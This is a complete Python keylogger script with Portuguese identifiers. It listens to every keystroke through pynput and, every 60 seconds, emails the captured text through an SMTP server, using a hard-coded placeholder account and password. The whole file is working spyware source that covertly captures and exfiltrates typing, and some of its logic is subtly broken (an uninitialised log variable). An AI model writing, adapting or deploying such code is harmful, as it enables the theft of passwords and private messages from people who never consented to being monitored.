from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

EMAIL_ORIGEM = "teste@servermail.com"
EMAIL_DESITINO = "teste@servermail.com"
SENHA_EMAIL = "senha123"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['Subject'] = 'Dados capturados pelo Keylogger'
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESITINO  
    try:
        server = smtplib.SMTP('smtp.servermail.com', 587)
        server.starttls()
        server.login(EMAIL_ORIGEM, SENHA_EMAIL)
        server.send_message(msg)
        server.quit()
    except Exception as e:
        print("Erro ao enviar", e)

    log = ""

    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            log += " "
        elif key == keyboard.Key.enter:
            log += "\n"
        elif key == keyboard.Key.tab:
            log += "\t"
        elif key == keyboard.Key.backspace:
            log += " "
        elif key == keyboard.Key.esc:
            log += " [ESC] "
        else:
            pass

with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join() 
